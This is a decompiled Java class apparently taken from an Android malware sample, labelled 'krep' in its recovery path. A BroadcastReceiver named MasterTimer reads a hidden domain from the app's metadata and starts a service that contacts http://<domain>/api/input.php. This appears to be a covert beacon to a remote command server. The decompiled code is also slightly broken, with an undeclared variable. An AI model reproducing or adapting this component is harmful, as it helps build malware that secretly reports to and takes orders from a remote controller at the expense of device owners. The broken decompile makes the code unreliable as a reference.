package krep.itmtd.ywtjexf;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Bundle;

public class MasterTimer
  extends BroadcastReceiver
{
  private Intent intent;
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    str = "";
    try
    {
      ApplicationInfo localApplicationInfo = paramContext.getPackageManager().getApplicationInfo(paramContext.getPackageName(), 128);
      paramIntent = str;
      if (localApplicationInfo.metaData != null) {
        paramIntent = localApplicationInfo.metaData.getString("domain");
      }
    }
    catch (PackageManager.NameNotFoundException paramIntent)
    {
      for (;;)
      {
        paramIntent.printStackTrace();
        paramIntent = str;
      }
    }
    this.intent = new Intent(paramContext, GlobalCode.class);
    this.intent.putExtra("content", "http://" + paramIntent + "/api/input.php");
    this.intent.putExtra("type", "Master");
    this.intent.putExtra("data", "");
    paramContext.startService(this.intent);
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/MasterTimer.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */